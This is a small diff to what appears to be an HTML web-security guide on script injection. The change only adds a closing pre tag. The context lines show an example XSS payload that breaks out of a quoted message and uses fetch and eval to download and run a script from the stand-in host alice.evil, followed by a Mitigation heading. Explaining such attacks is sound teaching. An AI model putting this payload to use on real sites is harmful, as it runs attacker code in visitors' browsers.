@@ -23460,6 +23460,7 @@ I like pie &quot;);fetch(&quot;https:// <i>alice.evil/js_xss.js&quot;).then(x=&g
 <p>Then the generated script looks like:</p>
 <pre>
 addMessage(&quot;I like pie &quot;);fetch(&quot;https://alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);// <i>&quot;);</i>
+</pre>
 <p>That adds the message I like pie, but it also <b>downloads and runs
 <b>https:<i>// alice.evil/js_xss.js</i></b> whenever someone visits Bob&apos;s site.</b></p>
 <p><b>Mitigation:</b></p>
